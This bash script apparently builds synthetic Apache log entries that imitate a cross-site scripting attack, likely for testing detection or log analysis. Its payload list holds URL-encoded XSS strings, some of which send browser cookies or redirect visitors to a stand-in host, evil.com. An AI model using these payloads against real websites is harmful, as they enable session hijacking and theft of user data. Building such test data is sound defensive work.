#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/orchestrator.conf"
source "$SCRIPT_DIR/inject-common.sh"

ATTACKER_IP="10.0.0.77"
COUNT=$(get_attack_lines)
DOMAINS=("domain1.ac.id" "domain3.ac.id")

XSS_PAYLOADS=(
    "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
    "/search?q=%3Cimg+src=x+onerror%3Dalert(1)%3E"
    "/post?title=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
    "/comment?body=%3Cscript%3Edocument.location=%27http://evil.com/steal%27%3C/script%3E"
    "/search?q=%22%3E%3Csvg+onload%3Dalert(1)%3E"
    "/post?p=javascript:alert(1)"
    "/search?q=%3Ciframe+src%3D%22javascript:alert(1)%22%3E"
    "/contact?name=%3Cscript%3Enew+Image().src%3D%27http://evil.com/%27%2Bdocument.cookie%3C/script%3E"
    "/search?q=%3C%73%63%72%69%70%74%3Ealert(1)%3C/%73%63%72%69%70%74%3E"
)

for ((i=0; i<COUNT; i++)); do
    dom="${DOMAINS[$((RANDOM % ${#DOMAINS[@]}))]}"
    payload="${XSS_PAYLOADS[$((RANDOM % ${#XSS_PAYLOADS[@]}))]}"
    inject_apache_access "$AGENTS_SHARED" "$dom" "$ATTACKER_IP" "GET" "$payload" "200" "Mozilla/5.0 (XSSer/1.8)"
done

# Multi-site
MS_XSS=("/prosman/?q=%3Cscript%3Ealert(1)%3C/script%3E" "/keamanan/?q=%3Cimg+src=x+onerror%3Dalert(1)%3E" "/jaringan/?q=%22%3E%3Csvg+onload%3Dalert(1)%3E" "/data/?q=%3Ciframe+src%3D%22javascript:alert(1)%22%3E")
for ((i=0; i<COUNT/4; i++)); do
    uri="${MS_XSS[$((RANDOM % ${#MS_XSS[@]}))]}"
    inject_apache_access "$AGENTS_MULTI" "labs.ac.id" "$ATTACKER_IP" "GET" "$uri" "200" "Mozilla/5.0 (XSSer/1.8)"
done

log_orch "scenario=web-xss lines=$((COUNT + COUNT/4)) attacker=${ATTACKER_IP}"
